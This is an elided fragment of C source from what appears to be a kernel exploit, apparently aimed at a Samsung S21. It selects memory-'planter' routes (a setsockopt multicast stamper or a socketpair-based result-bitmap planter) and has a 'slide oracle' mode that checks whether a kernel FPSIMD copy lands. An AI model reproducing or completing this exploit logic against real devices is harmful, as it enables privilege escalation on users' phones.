...
void *waiter_thread(void *arg __attribute__((unused))) {
  ...
  /* Main-route planter selection (runtime, default = legacy pselect).
   * EXP_ROUTE=setsockopt selects the native 64-bit MCAST_JOIN_SOURCE_GROUP
   * stamper; EXP_ROUTE=resbit selects the S21-specific result-bitmap planter
   * (socketpair farm, no geometry guessing). */
  {
    const char *route = getenv("EXP_ROUTE");
    if (route && strcmp(route, "setsockopt") == 0)
      do_setsockopt_stamp_route();
    else if (route && strcmp(route, "resbit") == 0)
      do_resbit_stamp_route();
    else
...
int run_exploit(int argc, char **argv) {
  ...
  disable_rseq_for_thread();
  set_limit();
  /* Tanimlama: thread'ler arasi log sirasi gercegi yansitsin (libc buffer
   * thread flush'una bagli kalmasin). Sadece log zamanlamasi degisir. */
...
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  {
    /* Direct copy-oracle (panic-free): no dance, no page prep, no walk.
     * Answers whether the kernel fpsimd copy lands (fpu24==marker). */
    const char *oracle = getenv("SLIDE_ORACLE_ONLY");
    if (oracle && *oracle && *oracle != '0') {
      pr_success("slide oracle direct mode (no dance, no walk)\n");
      slide_sigreturn_oracle_direct();
      return 0;
    }
  }
#endif
